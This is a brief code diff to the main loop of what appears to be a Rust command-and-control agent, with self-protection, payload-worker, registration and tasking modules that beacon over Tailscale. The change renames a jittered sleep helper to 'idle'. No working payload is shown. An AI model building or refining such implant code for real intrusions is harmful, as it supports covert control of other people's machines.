@@ -30,8 +30,6 @@ mod selfprotect;
 mod worker;
 mod helpers;
 
-use std::{thread, time::Duration};
-
 fn main() {
     // Worker subprocess mode — run payload and exit without any agent init.
     let args: Vec<String> = std::env::args().collect();
@@ -65,7 +63,7 @@ fn main() {
                 Ok(_) => break,
                 Err(e) => {
                     eprintln!("[TS] Tailscale init failed: {}, retrying...", e);
-                    helpers::sleep_with_jitter();
+                    helpers::idle();
                 }
             }
         }
@@ -78,7 +76,7 @@ fn main() {
                 Ok(_) => break,
                 Err(e) => {
                     eprintln!("[REG] Registration failed: {}, retrying...", e);
-                    helpers::sleep_with_jitter();
+                    helpers::idle();
                 }
             }
         }
@@ -90,6 +88,6 @@ fn main() {
         if let Err(e) = tasking::getTasking() {
             eprintln!("Tasking error: {}", e);
         }
-        helpers::sleep_with_jitter();
+        helpers::idle();
     }
 }
